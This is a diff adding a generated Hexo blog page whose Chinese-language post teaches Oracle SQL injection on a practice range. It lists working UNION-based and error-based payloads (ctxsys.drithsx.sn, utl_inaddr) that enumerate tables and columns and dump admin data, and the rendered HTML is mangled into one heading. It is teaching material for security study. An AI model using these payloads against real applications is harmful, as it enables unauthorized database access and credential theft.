@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>oracle注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的 适应高吞吐量的数据库解决方案。  基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dua">
+<meta property="og:type" content="article">
+<meta property="og:title" content="oracle注入">
+<meta property="og:url" content="http://yoursite.com/2019/10/20/oracle注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的 适应高吞吐量的数据库解决方案。  基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dua">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-20T13:48:02.524Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="oracle注入">
+<meta name="twitter:description" content="Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的 适应高吞吐量的数据库解决方案。  基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dua">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-oracle注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/oracle注入/" class="article-date">
+  <time datetime="2019-10-20T13:47:47.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      oracle注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的 适应高吞吐量的数据库解决方案。 </p>
+<h3 id="基础知识-1-Oracle-使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。-2-Oracle的数据类型是强匹配的-MYSQL是弱匹配-，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。-3-Oracle的单行注释符号是–，多行注释符号-。-4-获取数据库版本："><a href="#基础知识-1-Oracle-使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。-2-Oracle的数据类型是强匹配的-MYSQL是弱匹配-，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。-3-Oracle的单行注释符号是–，多行注释符号-。-4-获取数据库版本：" class="headerlink" title="基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。 2.Oracle的数据类型是强匹配的(MYSQL是弱匹配)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。 3.Oracle的单行注释符号是–，多行注释符号/**/。 4.获取数据库版本： "></a>基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。 2.Oracle的数据类型是强匹配的(MYSQL是弱匹配)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。 3.Oracle的单行注释符号是–，多行注释符号/**/。 4.获取数据库版本： <figure class="highlight plain"><figcaption><span>1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 实战靶场 首先输入一个单引号判断是否存在注入点。 ![](/upload/md/a0d846c7cb14733628301ef60086a30d_45037.png) 明显存在注入点，并且回显了ORA-01756，这明显是orale的数据库。接下来可以判断这几个字段的数据类型,把字段为改成相应的数据类型，若回显正确则，这个字段位就是这个数据类型，反之则不是。例如下面可确定第一个字段是数据类型。 ![](/upload/md/e4fa612c4d23351682f86559d608e746_75969.png) 通过select * from all_tables查询出所有表 ![](/upload/md/49bcf252958e0c73861ebf02c854fcf0_87398.png) 查询当前用户表：select * from user_tables ![](/upload/md/fe2580cda571e5c55e64dd4073cbcc64_82156.png) 发现当前用户只有news表和admin表，接下来查询这两个表的字段 select * from user_tab_columns ![](/upload/md/f1b36e9a72a0345df04fc91aa402a4e1_54879.png) 接下来select * from admin查看admin表的数据 ![](/upload/md/3f81c77910b3252c36029c6d4ec6bdce_85322.png) ``` &apos; and (select count(*) from admin)&lt;&gt;0-- ``` 返回正常。说明存在admin表。如果返回错误，可将admin改为username、manage等常用表名继续猜解 ``` &apos;and (select count(*) from admin)=1-- ``` 返回正常说明只有一个管理员,爆数据第一个表 ``` &apos;and 1=2 union all select 1,(select table_name from user_tables where rownum=1),null from dual-- ``` 可以这样爆第二个表 ``` &apos;and 1=2 union all select 1,(select table_name from user_tables where rownum=1 and table_name not in (&apos;第一个表&apos;)) from dual-- ``` 已知表的前提下，判断表中字段结构。 &apos;and (select count(user_name) from admin)&gt;=0-- 返回正常，说明存在name字段 &apos;and (select count(name) from admin)&gt;=0-- 返回错误，说明不存在pass字段 ``` &apos;and 1=2 union all select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名（大写的）&apos;),null from dual-- ``` 爆某表的第一个字段 ``` &apos;and 1=2 union all select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos; and column_name not in (&apos;第一个字段&apos;)),null from dual-- ``` 爆表的第二个字段 爆其它字段以此类推 爆某表中的第一行数据： &apos;and 1=2 union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --连接多个字段用到的连接符号是||,在oracle数据库中concat函数只能连接两个字符串。 以上的方法是字段是字符类型或者数字类型的，而靶场是使用二进制类型的数据存储方式，所以子查询是不能做的，可以使用盲注，但是很麻烦，所以利用一些特殊的函数进行报错注入。 ### 利用函数的报错注入 这里因为靶场不知为何挂了，演示不了，但是可以讲一下一些函数的报错注入方式。 </span><br><span class="line">#### utl_inaddr.get_host_name()函数 返回环境中的本主机名 ``` select UTL_INADDR.get_host_name() from dual; ``` 返回局域网内指定IP地址的主机名 ``` select UTL_INADDR.get_host_name(&apos;192.168.0.156&apos;) from dual; ``` 返回intrenet中指定IP地址的网址 Oracle的报错回显方法还有很多，比如利用函数之类的。因数量比较多，这里就不阐述了(百度有很多)。 #### CTXSYS.DRITHSX.SN()函数 ``` ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1)) ``` 去查询关于主题的对应关键字，然后因为查询失败(应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误而爆出查询的内容) ``` and 1=ctxsys.dirthsx.sn(1,(select banner from sys.v_$version where rownum=1))--</span><br></pre></td></tr></table></figure></h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/oracle注入/" data-id="ck1z1u10v0007ycv0l6bp3u0o" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/20/mssql注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          mssql注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/20/access数据库偏移注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">access数据库偏移注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
